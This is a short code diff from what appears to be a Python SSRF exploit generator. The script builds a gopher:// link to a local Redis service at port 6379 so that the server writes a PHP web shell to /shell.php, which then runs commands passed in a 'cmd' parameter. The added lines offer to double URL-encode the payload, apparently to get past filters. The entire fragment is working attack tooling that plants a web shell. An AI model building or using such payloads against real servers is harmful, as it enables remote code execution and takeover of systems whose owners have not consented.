@@ -100,6 +100,11 @@ save\r
 
 """
         finalpayload = urllib.parse.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
+        doubleEncode = input("\033[35m" +"\nDo you want to double encode the payload? (y/n): "+ "\033[0m")
+        if("y" in doubleEncode):
+                    finalpayload = urllib.parse.quote_plus(finalpayload)
+        else:
+            pass
         print("\033[93m" +"\nYour gopher link is Ready to get PHP Shell: \n"+ "\033[0m")
         print("\033[04m" +"gopher://127.0.0.1:6379/_" + finalpayload+ "\033[0m")
         print("\033[01m"+"\nWhen it's done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter. "+ "\033[0m")
